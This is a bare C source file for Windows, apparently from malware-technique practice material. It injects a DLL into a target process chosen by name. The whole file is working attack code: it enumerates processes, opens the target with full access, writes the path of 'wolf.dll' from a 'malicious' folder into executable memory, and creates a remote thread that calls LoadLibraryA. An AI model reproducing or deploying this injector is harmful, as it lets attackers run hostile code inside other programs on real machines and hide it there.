#include <windows.h>
#include <stdio.h>
#include <wtsapi32.h>
#pragma comment(lib, "wtsapi32.lib")

char evilDLL[] = "C:\\Users\\Administrator\\Desktop\\test\\malicious\\tips\\wolf.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;
int findMyProc(const char * procname) {
  int pid = 0;
  WTS_PROCESS_INFOA * pi;
  DWORD level = 1;
  DWORD count = 0;
  if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, level, &pi, &count))
    return 0;
  for (int i = 0 ; i < count ; i++ ) {
    if (lstrcmpiA(procname, pi[i].pProcessName) == 0) {
      pid = pi[i].ProcessId;
      break;
    }
  }
  WTSFreeMemory(pi);
  return pid;
}
int main(int argc, char* argv[]) {
  int pid = 0;
  HANDLE ph;
  HANDLE rt;
  LPVOID rb;
  pid = findMyProc(argv[1]);
  printf("%s%d\n", pid > 0 ? "Process Found PID = " : "Process Not Found. ", pid);
  HMODULE hKernel32 = GetModuleHandle("kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
  if (ph == NULL) {
    printf("OpenProcess failed! exiting...\n");
    return -2;
  }
  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
  CloseHandle(ph);
  return 0;
}
